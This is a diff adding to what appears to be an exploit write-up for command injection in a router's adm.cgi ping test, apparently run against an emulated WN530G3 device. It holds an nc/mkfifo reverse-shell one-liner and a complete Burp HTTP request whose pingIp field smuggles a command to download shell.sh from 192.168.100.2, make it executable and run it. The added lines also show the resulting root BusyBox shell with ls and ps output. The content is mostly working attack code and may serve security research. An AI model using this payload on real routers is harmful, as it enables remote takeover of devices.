@@ -164,7 +164,64 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.100.2 8888 >/tmp/f
 ````
 - burp suite payload final
 ````
+POST /cgi-bin/adm.cgi HTTP/1.1
+Host: 127.0.0.1
+Content-Length: 138
+Cache-Control: max-age=0
+sec-ch-ua: "Chromium";v="137", "Not/A)Brand";v="24"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Linux"
+Accept-Language: en-US,en;q=0.9
+Origin: http://127.0.0.1
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: iframe
+Referer: http://127.0.0.1/ping.shtml?r=28401
+Accept-Encoding: gzip, deflate, br
+Cookie: session=1317439536
+Connection: keep-alive
 
 page=ping_test&CCMD=1&pingIp=127.0.0.1`(curl http://192.168.100.2:8000/shell.sh -o /tmp/shell.sh; chmod 777 /tmp/shell.sh; /tmp/shell.sh)`
 ````
 - This payload will yield us a reverse shell on the target
+````
+EMUX HOSTFS [WN530G3]:~> nc -nlvp 8888
+Connection from 192.168.100.2:33580
+
+
+sh: can't access tty; job control turned off
+BusyBox v1.29.3 () built-in shell (ash)
+
+/etc/lighttpd/www/cgi-bin # ls
+ExportAllSettings.cgi
+adm.cgi
+applogin.cgi
+ddns.cgi
+firewall.cgi
+login.cgi
+nas.cgi
+nightled.cgi
+openvpn.cgi
+qos.cgi
+staticlist.cgi
+upload.cgi
+uploadVpn.cgi
+upload_settings.cgi
+wireless.cgi
+/etc/lighttpd/www/cgi-bin # ps
+  PID USER       VSZ STAT COMMAND
+    1 rootws    1936 S    init
+    2 rootws       0 SW   [kthreadd]
+    3 rootws       0 SW   [ksoftirqd/0]
+    4 rootws       0 SW   [events/0]
+    5 rootws       0 SW   [khelper]
+    8 rootws       0 SW   [async/mgr]
+  102 rootws       0 SW   [sync_supers]
+````
+
+
